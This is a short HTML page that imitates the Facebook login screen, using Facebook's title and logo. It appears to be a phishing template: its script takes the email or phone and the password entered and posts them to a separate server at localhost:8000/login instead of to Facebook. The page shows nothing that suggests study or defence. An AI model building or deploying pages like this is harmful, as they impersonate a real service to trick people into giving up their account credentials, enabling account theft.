<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  </head>

  <body>
    <div class="container">
      <div class="logo">
        <img src="https://i.imgur.com/UrqvJjT.png" alt="Facebook Logo">
      </div>
      <form>
        <input type="text" id="username" placeholder="Email address or phone number">
        <input type="password" id="password" placeholder="Password">
        <button type="button" onclick="login()">Log In</button>
      </form>
    </div>
    
    <script>
      function login() {
        var username = $("#username").val();
        var password = $("#password").val();
        $.post("http://localhost:8000/login", {username: username, password: password}, function(data) {
          alert(data);
        });
      }
    </script>
  </body>
</html>
